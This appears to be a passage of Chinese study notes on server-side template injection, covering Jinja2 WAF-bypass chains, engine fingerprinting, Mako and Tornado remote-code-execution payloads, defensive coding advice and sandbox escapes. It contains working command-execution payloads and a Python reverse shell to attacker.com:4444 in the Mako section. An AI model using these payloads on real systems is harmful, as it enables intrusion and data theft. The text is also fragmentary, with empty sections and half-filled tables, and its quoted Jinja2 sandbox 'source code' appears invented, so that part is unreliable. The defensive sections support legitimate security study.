**过滤场景**：WAF 检测到 `_` 字符，认为是**魔术方法**调用，直接拦截



##### **十六进制编码`\x5f`**

**原理**：`_` 的 ASCII 码是 95，十六进制为 `0x5f`，可以用 `\x5f` 表示

```python
# __class__ → \x5f\x5fclass\x5f\x5f
{{''["\x5f\x5fclass\x5f\x5f"]}}

# 完整 Payload
{{''["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()}}
```

完整链条示例：

```python
{{''["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[132]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]['popen']('whoami').read()}}
```

##### **request.args外部传参**

**原理**：将包含下划线的字符串通过 HTTP 参数传入，避免在 Payload 中直接出现

```python
# Payload
{{''|attr(request.args.x)}}

# 访问
?name={{''|attr(request.args.x)}}&x=__class__
```

完整链条示例：

```python
# Payload
{{''|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)()[132]|attr(request.args.d)|attr(request.args.e)['popen']('whoami').read()}}

# 访问
?name={{...}}&a=__class__&b=__base__&c=__subclasses__&d=__init__&e=__globals__
```

##### 从已有字符串中提取 dict()|join

**原理**：利用 `dict()` 构造字典，然后用 `join` 提取键名

```python
# 构造 'class'
{{dict(class=1)|join}}  # 输出 'class'

# 拼接成 '__class__'
{{"__"~dict(class=1)|join~"__"}}  # 输出 '__class__'
```

完整链条示例：

```python
# 第一步：构造下划线
{% set u = dict(__a=1)|join|list|first %}  # 提取 '_'

# 第二步：拼接 __class__
{% set class_str = u~u~dict(class=1)|join~u~u %}

# 第三步：使用
{{''|attr(class_str)}}
```

**原理**：使用 Unicode 转义序列 `\_` 表示下划线

```python
# request.cookies（隐蔽）
{{''|attr(request.cookies.x)}}
```

### 5.5.1 分块传输

**原理**：将完整的 Payload 拆分到多个 GET/POST 参数中

**原理**：切换 Content-Type 为 `application/json`


#### application/json


### 5.5.4 HTTP参数污染(HPP)

**原理**

**多次传递同一参数**，部分服务端会取第一个值，部分会取最后一个值

```http
# 原始
?name={{config}}

# HPP
?name={{config}}&name=test
```

**服务端行为**：

- PHP：取最后一个值 `test`
- ASP.NET：取所有值拼接 `{{config}},test`
- Python Flask：取第一个值 `{{config}}`

### 5.8.3 绕过思路树

```
遇到过滤
    ↓
是符号过滤？
    ├─ 是 → 查符号绕过速查表（5.8.1）
    │       ├─ 过滤 . → 用 [] 或 |attr
    │       ├─ 过滤 _ → 用 \x5f 或 request.args
    │       ├─ 过滤 [] → 用 . 或 __getitem__
    │       ├─ 过滤引号 → 用 request.args 或 dict()|join
    │       └─ 过滤 {{}} → 用 {% print() %}
    │
    └─ 否 → 是关键字过滤？
            ├─ 是 → 查关键字绕过速查表（5.8.2）
            │       ├─ 过滤 class → 拼接或反转
            │       ├─ 过滤 import → 拼接或直接用 os
            │       ├─ 过滤 os → 用 subprocess 或 dict()|join
            │       ├─ 过滤 eval → 直接用 os.popen
            │       └─ 过滤 config → 用 lipsum 或 request
            │
            └─ 否 → 极限场景（无数字/无引号/无任何字符）
                    └─ 查极限绕过方法（5.3）
                        ├─ 无数字 → 用 ()|count 或 {}|count
                        ├─ 无引号 → 用 request.args 或 dict()|join
                        └─ 无任何字符 → 组合使用多种方法
```

# 6. 其他模板引擎 SSTI

## 6.0 模板引擎识别与指纹探测

- **探测决策树**

拿到目标后，依次尝试以下 Payload，根据返回结果判断引擎类型：

```
第一步：输入 ${7*7}
    ├── 返回 49 → 可能是 Java 系 (Freemarker / Velocity / Thymeleaf) 或 Mako
    └── 不返回 49 → 进入第二步

第二步：输入 {{7*7}}
    ├── 返回 49 → 可能是 Jinja2 / Twig / Nunjucks / Tornado / Django
    │     └── 进一步输入 {{7*'7'}}
    │           ├── 返回 7777777 → Jinja2 / Nunjucks
    │           ├── 返回 49      → Twig
    │           └── 报错         → Django / Tornado
    └── 不返回 49 → 进入第三步

第三步：输入 <%= 7*7 %>
    ├── 返回 49 → ERB (Ruby) 或 EJS (Node.js)
    └── 不返回 49 → 进入第四步

第四步：输入 #{7*7}
    ├── 返回 49 → Jade/Pug (Node.js) 或 Thymeleaf (Java)
    └── 不返回 49 → 进入第五步

第五步：输入 {7*7}
    ├── 返回 49 → Smarty (PHP)
    └── 不返回 49 → 未知引擎，需要其他方法
```

- **指纹探测 Payload 速查表**

| 探测 Payload | 期望结果    | 对应引擎                           |
| ------------ | ----------- | ---------------------------------- |
| `${7*7}`     | `49`        | Freemarker / Velocity / Mako       |
| `{{7*7}}`    | `49`        | Jinja2 / Twig / Nunjucks / Tornado |
| `{{7*'7'}}`  | `7777777`   | **Jinja2** / Nunjucks              |
| `{{7*'7'}}`  | `49`        | **Twig**                           |
| `<%= 7*7 %>` | `49`        | ERB / EJS                          |
| `#{7*7}`     | `49`        | Jade/Pug / Thymeleaf               |
| `{7*7}`      | `49`        | Smarty                             |
| `{{7*7}}`    | 报错/无输出 | Django Templates                   |
| `${{7*7}}`   | `49`        | Thymeleaf (Spring EL)              |
| `[=7*7]`     | `49`        | Freemarker (方括号语法)            |

- **进阶指纹探测**

有时候基本探测不够精确，需要更深入的 Payload：

```python
# 区分 Jinja2 和 Nunjucks（都支持 {{7*'7'}} → 7777777）
{{range(10)}}          # Jinja2 返回 range 对象，Nunjucks 报错
{{loop.index}}         # Nunjucks 在 for 外报错，Jinja2 也报错
{{joiner()}}           # Nunjucks 支持，Jinja2 不支持这个全局函数的用法

# 区分 Freemarker 和 Velocity
${class.getClass()}    # Velocity 语法
<#assign x=7*7>${x}   # Freemarker 语法

# 区分 ERB 和 EJS
<%= self %>            # ERB 返回 main，EJS 报错
<%= process %>         # EJS 可能返回 [object process]，ERB 报错
```

## 6.1 Python 系模板引擎

### 6.1.1 Mako

> **Mako** 是 Python 中性能最好的模板引擎之一，被 Reddit、Yelp 等大型网站使用。
> **它是最容易利用的模板引擎之一**，因为它允许直接嵌入 Python 代码。

- **基本语法**

```python
# 表达式（会输出结果）
${expression}

# 代码块（直接写 Python 代码，不输出）
<%
    x = 1 + 1
    y = "hello"
%>

# 模块级代码块（在模块作用域执行）
<%!
    import os
    def my_func():
        return "hello"
%>

# 控制语句
% for item in items:
    ${item}
% endfor

% if condition:
    ${value}
% endif
```

- **探测 Payload**

```python
# 基础探测
${7*7}              # → 49

# 确认是 Mako（不是 Freemarker/Velocity）
${type(1)}          # → <class 'int'>（Python 特有）
${dir()}            # → 返回 Python dir() 结果
${self.module}      # → Mako 特有对象
```

- **RCE Payload**

Mako 可以直接嵌入 Python 代码，RCE 非常简单：

```python
# 方法一：代码块直接执行
<%
    import os
    result = os.popen('whoami').read()
%>
${result}

# 方法二：表达式内调用
${__import__('os').popen('whoami').read()}

# 方法三：模块级代码块
<%!
    import os
    x = os.popen('id').read()
%>
${x}

# 方法四：利用 self 对象
<%
    import subprocess
    output = subprocess.check_output(['cat', '/etc/passwd']).decode()
%>
${output}

# 方法五：反弹 Shell
<%
    import socket,subprocess,os
    s=socket.socket()
    s.connect(("attacker.com",4444))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/sh","-i"])
%>
```

- **读文件**

```python
# 方法一
${open('/etc/passwd').read()}

# 方法二
<%
    with open('/etc/passwd', 'r') as f:
        content = f.read()
%>
${content}

# 方法三
${__import__('io').open('/flag').read()}
```

- **Mako 比 Jinja2 更容易利用的原因**

| 对比项             | Jinja2       | Mako             |
| ------------------ | ------------ | ---------------- |
| 直接写 Python 代码 | ❌ 不支持     | ✅ `<% %>` 代码块 |
| 直接 import        | ❌ 不支持     | ✅ `import os`    |
| 直接调用 open()    | ❌ 被沙箱限制 | ✅ 可以直接用     |
| 需要 MRO 链        | ✅ 需要绕     | ❌ 不需要         |
| 利用难度           | 较高         | 极低             |

> [!CAUTION]
>
> **结论**：如果发现目标用的是 Mako，基本等于直接 RCE

### 6.1.2 Tornado

> **Tornado** 是 Facebook 开发的 Python Web 框架，内置自己的模板引擎。
> 在 CTF 中经常出现。

- **基本语法**

```python
# 表达式输出
{{ expression }}

# 语句块（支持 import！）
{% import os %}
{% from os import popen %}

# 条件语句
{% if condition %}
    ...
{% elif condition %}
    ...
{% else %}
    ...
{% end %}

# 循环
{% for item in items %}
    {{ item }}
{% end %}

# 注释
{# 这是注释 #}

# 原始输出（不转义）
{% raw expression %}

# 设置变量
{% set x = 1 + 1 %}
```

- **探测 Payload**

```python
# 基础探测
{{7*7}}             # → 49

# 确认是 Tornado（不是 Jinja2）
{{handler}}         # → Tornado 特有，返回 handler 对象
{{handler.settings}}  # → 返回应用配置（可能泄露密钥）
{{request}}         # → 返回请求对象
```

- **区分 Tornado 和 Jinja2**

| 探测方法               | Jinja2           | Tornado           |
| ---------------------- | ---------------- | ----------------- |
| `{{handler}}`          | 报错/未定义      | 返回 handler 对象 |
| `{{handler.settings}}` | 报错             | 返回配置字典      |
| `{{7*'7'}}`            | `7777777`        | `7777777` 或报错  |
| `{% import os %}`      | 报错             | 支持              |
| `{{lipsum}}`           | 返回函数         | 报错/未定义       |
| `{{config}}`           | 返回 Config 对象 | 报错/未定义       |

- **RCE Payload**

```
# 方法一：直接 import + 执行
{% import os %}
{{ os.popen('whoami').read() }}

# 方法二：from import
{% from os import popen %}
{{ popen('id').read() }}

# 方法三：利用 handler 对象
{{handler.__class__.__module__}}
# 通过 handler 的 MRO 链来获取可用类

# 方法四：利用 eval
{% import os %}
{{ eval("__import__('os').popen('whoami').read()") }}

# 方法五：subprocess
{% import subprocess %}
{{ subprocess.check_output('id', shell=True).decode() }}
```

- **handler 对象利用（信息泄露）**

Tornado 模板中默认可以访问 `handler` 对象，这是一个很有价值的攻击点：

```python
# 获取应用配置（可能包含 SECRET_KEY、数据库密码等）
{{handler.settings}}

# 获取应用对象
{{handler.application}}

# 获取请求信息
{{handler.request.headers}}
{{handler.request.cookies}}
{{handler.request.remote_ip}}

# 获取当前用户信息
{{handler.current_user}}

# 利用 handler 获取 MRO 链
{{handler.__class__.__mro__}}
{{handler.__class__.__bases__}}
```

- **CTF 中的 Tornado SSTI**

```python
# 题目通常会给一个可控参数
# URL: /error?msg={{handler.settings}}

# 第一步：探测是否存在 SSTI
/error?msg={{7*7}}       # → 49

# 第二步：确认是 Tornado
/error?msg={{handler}}   # → 返回 handler 对象信息

# 第三步：泄露配置
/error?msg={{handler.settings}}
# → {'cookie_secret': 'xxxx', 'debug': True, ...}

# 第四步：RCE
/error?msg={%25+import+os+%25}{{os.popen('cat+/flag').read()}}
# 注意 URL 编码：% → %25，空格 → +
```

### 6.1.3 Django Templates

> **Django 模板** 是所有主流模板引擎中 **安全性最强** 的。
> 它在设计上就不允许执行任意 Python 代码。

- **基本语法**

```python
# 变量输出
{{ variable }}

# 过滤器
{{ name|upper }}
{{ text|truncatewords:30 }}

# 标签
{% if condition %}...{% endif %}
{% for item in list %}...{% endfor %}
{% include "template.html" %}
{% block content %}...{% endblock %}

# 注释
{# 单行注释 #}
{% comment %}多行注释{% endcomment %}
```

- **为什么 Django 模板最安全？**

```
Django 模板的限制：
├── ❌ 不支持任意 Python 表达式
│     {{7*7}} → 不会计算，直接报错或空
├── ❌ 不支持函数调用带参数
│     {{func(arg)}} → 语法错误
├── ❌ 不支持 import
│     {% import os %} → 不存在这个标签
├── ❌ 不支持下划线开头的属性访问
│     {{obj.__class__}} → 被禁止
├── ❌ 不支持代码块
│     <% code %> → 不支持
└── ✅ 只支持简单的变量访问和过滤器
```

- **有限的攻击面**

虽然 Django 模板很安全，但仍有一些信息泄露的可能：

```python
# 1. 如果 settings 对象被传入模板上下文
{{ settings.SECRET_KEY }}
{{ settings.DATABASES }}
{{ settings.DEBUG }}

# 2. 利用 {% debug %} 标签（需要 DEBUG=True）
{% debug %}
# → 输出所有上下文变量的详细信息

# 3. 访问对象的属性（不能用下划线开头的）
{{ user.username }}
{{ user.password }}       # 如果有这个字段
{{ user.is_superuser }}

# 4. 利用模板过滤器（很有限）
{{ "test"|center:100 }}
```

- **Django SSTI 的 CVE 历史**

```
CVE-2023-36053 — EmailValidator/URLValidator ReDoS
CVE-2021-35042 — SQL 注入（不是 SSTI，但相关）

Django 模板本身几乎没有 RCE 类型的 CVE，
这证明了它的安全设计是成功的。
```

- **结论**

| 攻击类型 | 可行性                     |
| -------- | -------------------------- |
| RCE      | ❌ 几乎不可能               |
| 文件读取 | ❌ 不可能                   |
| 信息泄露 | ⚠️ 有限（取决于上下文变量） |
| XSS      | ⚠️ 如果关闭了自动转义       |

> [!CAUTION]
>
> **遇到 Django 模板，基本可以放弃 RCE 的想法**，转向其他攻击面

## 7.1 沙箱机制原理

### 7.1.1 概念

**沙箱** 是一种安全机制，它将代码的执行限制在一个受控的环境中，阻止其访问敏感资源。

```
正常环境                      沙箱环境
────────────                  ────────────
✅ import os                   ❌ import os          → 被拦截
✅ open('/etc/passwd')         ❌ open(...)          → 被拦截
✅ eval('...')                 ❌ eval(...)          → 被拦截
✅ 访问 __class__              ❌ 访问 __class__     → 被拦截
✅ 访问 __globals__            ❌ 访问 __globals__   → 被拦截
```

### 7.1.2 Jinja2的沙箱环境

Jinja2 官方提供了沙箱环境 `SandboxedEnvironment`，这是防御 SSTI 的 **核心机制**

**适用方式**

```python
from jinja2 import Environment          # 普通环境（危险）
from jinja2.sandbox import SandboxedEnvironment  # 沙箱环境（安全）
from jinja2.sandbox import ImmutableSandboxedEnvironment  # 更严格的沙箱

# ❌ 危险用法
env = Environment()
template = env.from_string(user_input)
template.render()

# ✅ 安全用法
env = SandboxedEnvironment()
template = env.from_string(user_input)
template.render()
```

**沙箱的限制内容**

`SandboxedEnvironment` 具体限制了什么，看一下源码的核心逻辑

```python
# jinja2/sandbox.py 核心代码
class SandboxedEnvironment(Environment):
    
    # 1. 禁止访问的属性（以下划线开头的都被禁用）
    intercepted_binops = frozenset(['//', '**'])  # 某些二元操作
    
    def is_safe_attribute(self, obj, attr, value):
        """判断属性是否安全"""
        return not (attr.startswith('_') or attr in UNSAFE_ATTRS)
    
    def is_safe_callable(self, obj):
        """判断对象是否可调用"""
        return not (
            getattr(obj, 'unsafe_callable', False) or 
            getattr(obj, 'alters_data', False)
        )

# 被禁止的危险属性列表
UNSAFE_ATTRS = {
    '__class__', '__subclasses__', '__mro__', '__bases__',
    '__globals__', '__builtins__', '__import__', '__code__',
    '__func__', '__closure__', '__dict__', '__init__',
    'func_globals', 'func_code', 'im_class', 'im_func',
}
```

**测试沙箱效果**

```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()

# 攻击 Payload（在普通 Environment 中可以 RCE）
payload = "{{''.__class__.__mro__[1].__subclasses__()}}"

try:
    result = env.from_string(payload).render()
    print(result)
except Exception as e:
    print(f"沙箱拦截：{e}")
# 输出：沙箱拦截：access to attribute '__class__' of 'str' object is unsafe.
```

#### ImmutableSandboxedEnvironment(更严格)

```python
from jinja2.sandbox import ImmutableSandboxedEnvironment

# 在 SandboxedEnvironment 基础上，禁止修改 list/dict 等可变对象
env = ImmutableSandboxedEnvironment()

payload = "{% set x = [] %}{{x.append(1)}}"  # 会被拦截
```

| 引擎           | 沙箱机制                           | 默认是否启用 |
| -------------- | ---------------------------------- | ------------ |
| **Jinja2**     | SandboxedEnvironment               | 需要手动启用 |

| **Smarty**     | `$security_class` 配置             | 需要手动启用 |

#### Twig沙箱

```php
use Twig\Sandbox\SecurityPolicy;
use Twig\Extension\SandboxExtension;

// 定义白名单
$tags = ['if'];                           // 允许的标签
$filters = ['upper', 'escape'];           // 允许的过滤器
$methods = ['Article' => ['getTitle']];   // 允许的方法
$properties = ['Article' => ['title']];   // 允许的属性
$functions = ['range'];                    // 允许的函数

$policy = new SecurityPolicy($tags, $filters, $methods, $properties, $functions);
$sandbox = new SandboxExtension($policy);
$twig->addExtension($sandbox);

// 使用沙箱渲染
$template = $twig->createTemplate($userInput);
$template->render([], true);  // 第二个参数 true 表示启用沙箱
```

## 7.2 输入过滤与白名单

### 7.2.1 黑名单过滤（不推荐）

黑名单过滤是 **最脆弱** 的防御方式，因为绕过方法层出不穷。

- **常见的黑名单实现**

```python
# ❌ 脆弱的黑名单
BLACKLIST = [
    '__class__', '__mro__', '__subclasses__', '__globals__',
    '__builtins__', '__import__', 'eval', 'exec', 'os',
    'system', 'popen', 'subprocess'
]

def filter_input(user_input):
    for keyword in BLACKLIST:
        if keyword in user_input:
            return None  # 拦截
    return user_input
```

### 7.2.2 **白名单过滤**

```python
import re

# ✅ 相对安全的白名单
def strict_whitelist(user_input):
    # 只允许字母、数字、空格、基本标点
    if not re.match(r'^[a-zA-Z0-9\s.,!?]+$', user_input):
        return None
    return user_input
```

## 7.3 模板与数据分离（核心原则）

### 7.3.1 SSTI 的根本原因

**SSTI 的本质：将用户输入当作模板代码渲染，而不是当作数据。**

```python
# ❌ 错误示例 1：直接渲染用户输入
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    name = request.args.get('name', 'Guest')
    template = f"<h1>Hello, {name}!</h1>"  # ❌ 拼接用户输入
    return render_template_string(template)

# 攻击：/?name={{7*7}} → 页面显示 49
```

```python
# ❌ 错误示例 2：使用 Template 类直接渲染
from jinja2 import Template

def greet(user_input):
    t = Template("Hello, " + user_input)  # ❌ 拼接
    return t.render()
```

```python
# ❌ 错误示例 3：动态模板内容
@app.route('/page')
def page():
    content = request.args.get('content')
    return render_template_string(content)  # ❌ 用户完全控制模板
```

### 7.3.2 正确的使用方式

```python
# ✅ 正确方式 1：用户输入作为数据
@app.route('/')
def index():
    name = request.args.get('name', 'Guest')
    # 模板固定，用户输入作为 context 变量
    return render_template_string("<h1>Hello, {{ name }}!</h1>", name=name)
```

```python
# ✅ 正确方式 2：使用静态模板文件
@app.route('/')
def index():
    name = request.args.get('name', 'Guest')
    return render_template('index.html', name=name)
    # index.html: <h1>Hello, {{ name }}!</h1>
```

```python
# ✅ 正确方式 3：即使必须动态模板，也要沙箱 + 白名单
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()

@app.route('/render')
def render():
    # 仅管理员可用
    if not current_user.is_admin:
        abort(403)
    
    template_content = get_template_from_db()  # 从可信源获取
    template = env.from_string(template_content)
    return template.render(user=current_user)
```

### 7.3.3 常见误区

```python
# ❌ 误区 1：认为 escape 可以防 SSTI
from markupsafe import escape

name = escape(request.args.get('name'))
return render_template_string(f"<h1>Hello, {name}!</h1>")
# escape 只防 XSS，不防 SSTI！
# {{7*7}} 经过 escape 仍然是 {{7*7}}，渲染时仍然会被执行

# ❌ 误区 2：认为字符串长度限制能防 SSTI
if len(user_input) > 50:
    abort(400)
# 很多 SSTI payload 长度 < 50

# ❌ 误区 3：以为用 format 就安全
template = "Hello, {name}".format(name=user_input)
# 这是 Python 的 format 字符串注入漏洞，也存在风险
# user_input = "{name.__class__}" 会泄露信息
```

## 7.4 自动转义（Autoescape）

### 7.4.1 Autoescape 的作用与局限

**自动转义** 是模板引擎的一个安全特性，用于防止 XSS，**但它对 SSTI 无效**。

```python
# Flask 默认启用 autoescape（.html/.htm/.xml/.xhtml 文件）
from flask import render_template

# autoescape 会将 <, >, &, ", ' 转义为 HTML 实体
# 但不会影响 {{ }} 的解析
```

### 7.4.2 开启与关闭 Autoescape

```python
from jinja2 import Environment, select_autoescape

# ✅ 推荐配置
env = Environment(
    autoescape=select_autoescape(['html', 'htm', 'xml'])
)

# ⚠️ 谨慎使用
env = Environment(autoescape=False)  # 关闭自动转义，容易引入 XSS
```

### 7.4.3 `|safe` 过滤器的陷阱

```python
<!-- ❌ 危险用法 -->
{{ user_comment|safe }}       <!-- 用户输入不转义 → XSS -->

<!-- ✅ 正确用法 -->
{{ user_comment }}            <!-- 自动转义 → 安全 -->

<!-- ⚠️ 仅对可信数据使用 safe -->
{{ system_notice|safe }}      <!-- 系统生成的 HTML，安全 -->
```

### 7.4.4 Autoescape vs SSTI 的关系

| 攻击类型         | Autoescape 能防御吗？ |
| ---------------- | --------------------- |
| XSS（跨站脚本）  | ✅ 可以                |
| SSTI（模板注入） | ❌ 不可以              |
| SQL 注入         | ❌ 不可以              |
| 命令注入         | ❌ 不可以              |

> **关键认知**：Autoescape 只在「渲染阶段」对输出做转义，而 SSTI 发生在「解析阶段」，早于输出转义。

## 7.5 安全编码规范

### 7.5.1 开发阶段规范（Checklist）

```python
□ 1. 永远不要用用户输入拼接模板字符串
□ 2. 始终将用户输入作为 context 变量传入
□ 3. 如果必须动态模板，使用 SandboxedEnvironment
□ 4. 启用 autoescape（即使用了沙箱）
□ 5. 对模板内容来源做严格控制（白名单/管理员权限）
□ 6. 避免使用 render_template_string 处理用户输入
□ 7. 敏感对象（如 config、request）不要传入模板上下文
□ 8. 定期更新模板引擎版本（修复已知 CVE）
□ 9. 启用 WAF 作为纵深防御（不是唯一防线）
□ 10. 代码审计时重点关注模板渲染函数
```

```python
# 2. RASP（运行时应用自保护）
# 在模板渲染函数处设置 Hook，检测危险属性访问
import functools
from jinja2 import Environment

original_from_string = Environment.from_string

@functools.wraps(original_from_string)
def safe_from_string(self, source, *args, **kwargs):
    dangerous = ['__class__', '__mro__', '__subclasses__', '__globals__']
    for kw in dangerous:
        if kw in source:
            raise SecurityError(f"Blocked dangerous keyword: {kw}")
    return original_from_string(self, source, *args, **kwargs)

Environment.from_string = safe_from_string
```

# 8. 沙箱逃逸

>对于沙箱的概念以及在**7.Flask模板注入漏洞**中进行了阐述，不再多说。

## 8.1 思路

- **条件梳理**

**拥有的权利**：访问传入的变量、基础数据类型（字符串、列表、字典）、Jinja2 自带的过滤器
**被剥夺权利**：没有 `import` 语句，无法直接调用 `os`、`sys` 等系统模块，没有 `open()` 函数等、

### A.利用已导入的模块

- **核心思想**寻找一个子类，它的代码里已经导入了os或subprocess模块。我们直接借用它的全局变量来执行命令
- **寻找目标**：遍历 `object.__subclasses__()`，寻找像 `os._wrap_close`、`subprocess.Popen` 这样的类
- **路径**：对象 -> 基类 -> 子类列表 -> `os._wrap_close` -> `__init__` -> `__globals__` -> popen
  `#` 就是找到是`.__subclasses__()[]`的哪一个子类
 - **优点**：路径短，**缺点**：非常依赖环境

### B.找到__builtins__

- **核心思想**：寻找一个子类，它没有直接导入os，但它的全局变量里包含 `__builtins__`。通过 `__builtins__`，我们可以调用 `__import__` 函数，动态导入任何我们想要的模块。
- **寻找目标**：经典的跳板是 `warnings.catch_warnings`（几乎所有 Web 环境都会加载它，且它包含了 `__builtins__`）
- **路径**：对象 -> 基类 -> 子类列表 -> `warnings.catch_warnings` -> `__init__` -> `__globals__` -> `__builtins__` -> `__import__` -> os -> popen
- **优点**：极度通用，威力最大。只要找到 `__builtins__`，你想干什么都行（读写文件、反弹Shell）**缺点**：payload较长

### 捷径

| 捷径对象 | 描述                                                         | 利用方式                                                     | Payload 示例                                                 |
| -------- | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |

### 8.2.1 Jinja2 SandboxedEnvironment 逃逸

- **原理分析**

`SandboxedEnvironment` 的核心防御是拦截 `__` 开头的属性访问，但它有漏洞：

```python
# 被拦截的访问方式
{{ ''.__class__ }}                    # ❌ 被拦截

# 可能的绕过方式
{{ ''|attr('__class__') }}             # ⚠️ 某些版本被拦截，某些版本可以
{{ (()|select|string|list).pop(24) }}  # 提取单个字符后拼接
```

- **已知的历史逃逸 CVE**

```python
CVE-2016-10745 (Jinja2 < 2.8.1)
  — 沙箱中 str.format 可被利用
  — Payload: "{0.__class__}".format(obj)

CVE-2019-8341 (Jinja2 < 2.10.1)
  — from_string 的 disable_autoescape 问题
  
CVE-2024-22195 (Jinja2 < 3.1.3)
  — xmlattr 过滤器可被利用进行 XSS
```

- **沙箱逃逸 Payload 示例**

```python
# 基于 str.format 的逃逸（旧版本）
CONFIG = "{0.__class__.__init__.__globals__[os].popen('id').read()}"
CONFIG.format(some_object)

# 基于 attr 过滤器的逃逸
{{ ''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')[1] }}

# 利用过滤器链逃逸（某些沙箱未禁用）
{{ config.items()|first|last }}      # 从 config 泄露信息
{{ namespace.__init__.__globals__ }} # 如果 namespace 未被禁用
```

### 8.2.5 通用沙箱逃逸思路

无论什么沙箱，逃逸的核心思路都是：

```
1. 寻找未被禁用的入口
   ├── 上下文中的对象（request, config, session）
   ├── 内置函数的返回值
   └── 过滤器/扩展引入的新对象

2. 通过该入口访问更危险的对象
   ├── Class 对象（反射）
   ├── Module 对象（全局命名空间）
   └── 内建函数（__builtins__）

3. 利用编码/拼接绕过字符串过滤
   ├── Unicode 编码（\u005f）
   ├── 十六进制编码（\x5f）
   ├── 字符串拼接（'cla'+'ss'）
   └── 反转（[::-1]）

4. 最终达到命令执行
   ├── popen / system / exec
   ├── ScriptEngine.eval
   └── ProcessBuilder
```
